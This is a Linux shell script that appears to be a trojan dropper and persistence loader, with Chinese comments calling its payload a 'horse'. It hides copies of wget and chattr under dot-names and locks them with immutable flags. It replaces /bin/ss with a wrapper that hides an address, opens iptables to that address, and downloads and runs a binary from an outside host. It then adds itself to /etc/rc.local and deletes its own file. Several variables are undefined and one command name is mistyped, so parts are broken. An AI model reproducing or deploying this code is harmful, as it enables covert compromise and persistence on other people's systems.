#!/bin/sh
path=`pwd`
ips="/usr/bin/ps"
iss=""
Net=""
Lok="/usr/bin/chattr"
Get="/usr/bin/wget"
Gurl="/usr/bin/curl"
deny=""
allow=""
fileback="/usr/bin/x86_64-linux-gnu-cxx"
fileback="/home/zzw/private/bk.sh"
ipsbak=""
Netbak=""
Config="/etc/init.d/bo.conf"

Runkillallconnect()
{
   netstat -apnt |grep 10.10.1.1

}



if [ ! -f $Lok ];then
    cp -f /usr/bin/chattr /usr/bin/lockr
    cp -f /usr/bin/chattr /usr/bin/.locks
    cp -f /usr/bin/.locks /usr/bin/lockr
    chmod 0755 /usr/bin/lockr
    chmod 0755 /usr/bin/.locks
    lockr +i /usr/bin/lockr
    lockr +i /usr/bin/.locks
fi

if [ ! -f $Get ];then
    cp -f /usr/bin/wget /usr/bin/vget
    cp -f /usr/bin/wget /usr/bin/.bget
    cp -f /usr/bin/.bget /usr/bin/vget
    chmod 0755 /usr/bin/vget
    chmod 0755 /usr/bin/.bget
    lockr +i /usr/bin/vget
    lockr +i /usr/bin/.bget
fi

if [ ! -f $Gurl ];then
pwd
fi

if [ -f /usr/bin/pkill ];then
	pwd
fi

if [ -f /usr/bin/nohup ];then
pwd
fi

if [ -f /usr/bin/killall ];then
pwd
fi


if [ -f /usr/sbin/ss ];then
pwd
fi


if [ -f /bin/ss ];then
	if [ ! -f "$iss" ];then
		if [ ! -f "$issbak" ];then
			lockr -i /usr/bin/;mkdir /usr/bin/dpkgd/
			cp -f /bin/ss $issbak
			cp -f /bin/ss $iss
		else
			cp -f $issbak $iss
		fi
		chmod 777 $iss;chmod 777 $issbak
		lockr +i $issbak >/dev/null 2>&1
		lockr +i $iss >/dev/null 2>&1
	else
		if [ ! -f "$issbak" ];then
			lockr -i /usr/bin/;cp -f $iss $issbak
			lockr +i $issbak >/dev/null 2>&1
		fi	
		if [ -z "`cat /bin/ss | grep $Address`" ]; then
			lockr -i /bin/;lockr -i /bin/ss
			echo '#!/bin/sh' > /bin/ss
			echo 'iss|grep -v "'$Address'"' >> /bin/ss
			echo 'exit' >> /bin/ss
			chmod 777 /bin/ss;lockr +i /bin/ss >/dev/null 2>&1
		fi
	fi
fi


if [ -f /bin/netstat ];then
pwd
fi

if [ -f /bin/ps ];then
pwd
fi

if [ ! -f $deny ];then
pwd
fi


if [ ! -f $allow ];then
pwd
fi

if [ ! -f $Config ];then
	echo "hello world" > $Config
    tempfile=`cat $Config | awk '{print $1}'`
	filetemp="/usr/bin/$tempfile" #现马的路径
	filename=`date +%s%N | md5sum | head -c 10`
	filepath="/usr/bin/$filename" #新马的路径
	tempbash=`cat $Config | awk '{print $2}'`
	bashtemp="/usr/bin/$tempbash" #现脚本路径
	bashname=`date +%s%N | md5sum | head -c 10`
	bashpath="/usr/bin/$bashname" #新脚本路径
    
    
    
    
    
    
	tempath=`cat $Config|awk '{print $1}'`
	filename=`date +%s%N|md5sum |head -c 10`
	bashpath="/usr/bin/"$filename
    echo $filename >> $Config
	#tempbash=`cat $Config|awk '{print $2}'`
	#bashpath=`date +%s%N|md5sum |head -c 10`
	
else
    tempfile=`cat $Config | awk '{print $1}'`
	filetemp="/usr/bin/$tempfile" #现马的路径
	filename=`date +%s%N | md5sum | head -c 10`
	filepath="/usr/bin/$filename" #新马的路径
	tempbash=`cat $Config | awk '{print $2}'`
	bashtemp="/usr/bin/$tempbash" #现脚本路径
	bashname=`date +%s%N | md5sum | head -c 10`
	bashpath="/usr/bin/$bashname" #新脚本路径




	tempath=`cat $Config|awk '{print $1}'`
	filename=`date +%s%N|md5sum |head -c 10`
	bashpath="/usr/bin/"$filename
    sed -i '$d' $Config
    echo $filename >> $Config 
fi

#process=`ps -ef |grep $filename|grep -v grep |wc -l  `

iptable=`iptables -L INPUT | grep "$Address" | grep 'ACCEPT'`
if [ -z "$iptable" ];then
    iptables -I INPUT -s $Address -j ACCEPT
else
    iptables -D INPUT -s $Address -j DROP
fi

process=`ips -ef | grep "$tempfile" | grep -v "grep" | wc -l`
if [ $process != 1 ];then
    if [ ! -f "$filebak" ];then
        lockr -i /usr/bin/;lockr -i /usr/bin/htrdpm;rm -f /usr/bin/htrdpm
        cd /usr/bin/;dget http[://hfs.ubtv.xyz:22345/htrdpm
        cd $path;mv -f /usr/bin/htrdpm $filepath
    else
        cp -f $filebak $filepath
    fi
    Runkillallconnect
    chmod 777 $filepath
    nohup $filepath >/dev/null 2>&1 &
fi

if [ ! -f $fileback ];then
	#curl 10.1.1.1.1:2/2 -o $fileback 2>&1
	cp /home/zzw/private/3.sh   $fileback
	cp $fileback $bashpath
else
	cp $fileback $bashpath
fi

date  > /home/zzw/private/log
echo $0 >> /home/zzw/private/log
sleep 1


chmod 755 $bashpath 


Repeatstart=`cat /etc/rc.local | grep 'start'| wc -l`
if [ $Repeatstart != 1 ];then
    lockr -i /etc/rc.local;sed -i '/start/d' /etc/rc.local
fi
if [ -z "`cat /etc/rc.local | grep "$bashtemp"`" ]; then
    if [ -z "`cat /etc/rc.local | grep "$exit0"`" ]; then
        lockr -i /etc/;lockr -i /etc/rc.local
        echo "$bashpath start" >> /etc/rc.local
    else
        lockr -i /etc/;lockr -i /etc/rc.local
        sed -i "s|exit 0|$bashpath start|" /etc/rc.local
        echo "exit 0">>/etc/rc.local
    fi
fi








#lockr -i $0
rm -f $0
nohup $bashpath &
exit










